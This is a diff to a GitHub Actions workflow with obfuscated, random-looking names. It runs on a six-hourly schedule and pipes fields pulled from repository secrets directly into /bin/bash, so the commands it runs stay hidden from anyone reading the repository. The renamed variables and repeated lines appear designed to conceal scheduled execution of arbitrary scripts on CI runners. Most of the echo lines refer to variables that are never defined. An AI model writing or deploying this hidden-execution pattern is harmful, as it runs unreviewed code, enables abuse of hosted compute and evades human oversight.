@@ -1,25 +1,31 @@
 name: diaoyubu3478
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 3/6 * * *'
+    - cron: '41 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: diaoyubu3478
         env:
-          jsr3893: ${{ secrets.jsr3893 }}
+          epbk392: ${{ secrets.epbk392 }}
         run: |
-          echo $jsr3893 | jq -r .yedu13 | /bin/bash
-          echo $vvb46020 | jq -r .yjoge22 | /bin/bash
-          echo $vef525 | jq -r .enbk727 | /bin/bash
-          echo $zsdjt4 | jq -r .qqkvh3 | /bin/bash
-          echo $tg8 | jq -r .bq70034 | /bin/bash
-          echo $zcl0 | jq -r .lsmh8 | /bin/bash
-          echo $j0212 | jq -r .mjyd78625 | /bin/bash
-          echo $syqea2876 | jq -r .hfc57026 | /bin/bash
+          echo $epbk392 | jq -r .f5256 | /bin/bash
+          echo $ehxs6336 | jq -r .kxis2 | /bin/bash
+          echo $g3373 | jq -r .sp08368 | /bin/bash
+          echo $lnw582 | jq -r .fggik26343 | /bin/bash
+          echo $ru82 | jq -r .ogoan7888 | /bin/bash
+          echo $xh99113 | jq -r .k44867 | /bin/bash
+          echo $cgs7646 | jq -r .r4 | /bin/bash
+          echo $e76 | jq -r .qbx3 | /bin/bash
+          echo $gu1 | jq -r .t9791 | /bin/bash
+          echo $rzbl3474 | jq -r .p55 | /bin/bash
+          echo $xbo2 | jq -r .nhrg2 | /bin/bash
+          echo $tnpv630 | jq -r .v4 | /bin/bash
+          echo $xxt361 | jq -r .eg775 | /bin/bash
+          echo $k92835 | jq -r .gtwe114 | /bin/bash
 
